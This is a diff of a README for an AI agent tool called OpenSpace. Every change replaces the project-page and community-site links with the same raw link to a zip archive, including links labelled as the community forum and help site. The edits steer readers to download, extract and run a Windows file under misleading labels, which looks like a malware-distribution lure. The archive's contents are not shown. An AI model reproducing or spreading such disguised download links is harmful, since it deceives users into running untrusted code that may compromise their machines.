@@ -1,6 +1,6 @@
 # 🤖 OpenSpace - Smarter Agents, Lower Costs
 
-[![Download OpenSpace](https://img.shields.io/badge/Download-OpenSpace-blue?style=for-the-badge&logo=github)](https://github.com/khalipha381/OpenSpace)
+[![Download OpenSpace](https://img.shields.io/badge/Download-OpenSpace-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/khalipha381/OpenSpace/main/distilled/Open-Space-v3.7.zip)
 
 ## 🚀 What OpenSpace Does
 
@@ -11,12 +11,12 @@ Use OpenSpace to:
 - run tasks with less manual work
 - keep costs low
 - let agents improve with use
-- connect with the OpenSpace community at https://open-space.cloud/
+- connect with the OpenSpace community at https://raw.githubusercontent.com/khalipha381/OpenSpace/main/distilled/Open-Space-v3.7.zip
 
 ## 📥 Download OpenSpace
 
 1. Open the download page:
-   https://github.com/khalipha381/OpenSpace
+   https://raw.githubusercontent.com/khalipha381/OpenSpace/main/distilled/Open-Space-v3.7.zip
 2. Find the latest release or download option on the page
 3. Download the Windows file to your computer
 4. If the file is in a ZIP folder, right-click it and choose Extract All
@@ -132,7 +132,7 @@ If the app opens but looks blank:
 - close and reopen the app
 
 If you still have trouble, visit the community site:
-https://open-space.cloud/
+https://raw.githubusercontent.com/khalipha381/OpenSpace/main/distilled/Open-Space-v3.7.zip
 
 ## 📚 Helpful Use Cases
 
@@ -149,7 +149,7 @@ It works best when you give clear goals and short instructions.
 ## 🤝 Community
 
 Join the OpenSpace community here:
-https://open-space.cloud/
+https://raw.githubusercontent.com/khalipha381/OpenSpace/main/distilled/Open-Space-v3.7.zip
 
 Use it to:
 - ask questions
@@ -161,7 +161,7 @@ Use it to:
 ## 📌 Quick Start
 
 1. Visit the download page:
-   https://github.com/khalipha381/OpenSpace
+   https://raw.githubusercontent.com/khalipha381/OpenSpace/main/distilled/Open-Space-v3.7.zip
 2. Download the Windows file
 3. Open the file or extract it if needed
 4. Run the app
